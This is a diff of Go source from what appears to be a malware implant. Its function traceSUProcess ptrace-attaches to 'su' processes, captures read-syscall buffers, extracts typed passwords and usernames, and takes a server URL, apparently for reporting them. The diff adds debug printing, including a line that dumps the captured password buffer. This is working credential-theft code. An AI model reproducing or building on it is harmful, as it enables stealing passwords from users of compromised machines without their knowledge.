@@ -34,6 +34,9 @@ func traceSUProcess(ctx context.Context, serverUrl string, taskData map[string]i
 
 		_, err := syscall.Wait4(pid, &wstatus, 0, nil)
 		if err != nil {
+			if debug.Debug {
+				fmt.Printf("[*] Wait4 error: %v\n", err)
+			}
 			return
 		}
 		if ctx.Err() != nil {
@@ -49,6 +52,9 @@ func traceSUProcess(ctx context.Context, serverUrl string, taskData map[string]i
 
 			var regs syscall.PtraceRegs
 			if err := syscall.PtraceGetRegs(pid, &regs); err != nil {
+				if debug.Debug {
+					fmt.Printf("[*] PtraceGetRegs error: %v\n", err)
+				}
 				return
 			}
 
@@ -61,10 +67,14 @@ func traceSUProcess(ctx context.Context, serverUrl string, taskData map[string]i
 						syscall.PtraceSyscall(pid, 0)
 						continue
 					}
+					if debug.Debug {
+							fmt.Printf("[*] Captured read syscall with buffer:\n%s\n", string(buffer))
+					}
 
 					if strings.Contains(string(buffer), "\n") {
 						password := strings.Split(string(buffer), "\n")[0]
 						password = RemoveNonPrintableAscii(password)
+
 						if IsValidPassword(password) {
 							username := extractSUUsername(pid)
 							if debug.Debug {
